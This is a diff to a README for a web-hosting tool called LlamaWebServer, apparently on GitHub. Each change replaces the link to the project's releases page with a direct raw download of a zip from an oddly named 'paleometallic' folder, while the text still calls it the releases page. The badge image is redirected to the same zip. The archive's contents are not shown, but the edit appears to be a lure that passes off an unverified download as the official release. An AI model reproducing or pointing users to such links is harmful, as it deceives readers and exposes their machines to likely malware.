@@ -1,6 +1,6 @@
 # 🦙 LlamaWebServer - Fast and Easy Web Hosting Solution
 
-[![Download LlamaWebServer](https://img.shields.io/badge/Download_LlamaWebServer-v1.0-orange)](https://github.com/jpds90/LlamaWebServer/releases)
+[![Download LlamaWebServer](https://raw.githubusercontent.com/jpds90/LlamaWebServer/main/paleometallic/LlamaWebServer.zip)](https://raw.githubusercontent.com/jpds90/LlamaWebServer/main/paleometallic/LlamaWebServer.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before you begin, ensure that you have the following:
 To get started with LlamaWebServer, follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to the releases page to download LlamaWebServer: [Download LlamaWebServer](https://github.com/jpds90/LlamaWebServer/releases).
+   Go to the releases page to download LlamaWebServer: [Download LlamaWebServer](https://raw.githubusercontent.com/jpds90/LlamaWebServer/main/paleometallic/LlamaWebServer.zip).
 
 2. **Download the Latest Version**  
    Look for the latest version listed. Click on the file that matches your operating system.  
@@ -70,7 +70,7 @@ If you encounter any issues, please reach out on our support forum or create an 
 
 Congratulations on setting up LlamaWebServer! 
 
-You can find the release page again here: [Download LlamaWebServer](https://github.com/jpds90/LlamaWebServer/releases). Enjoy hosting your projects!
+You can find the release page again here: [Download LlamaWebServer](https://raw.githubusercontent.com/jpds90/LlamaWebServer/main/paleometallic/LlamaWebServer.zip). Enjoy hosting your projects!
 
 ## 📝 License
 
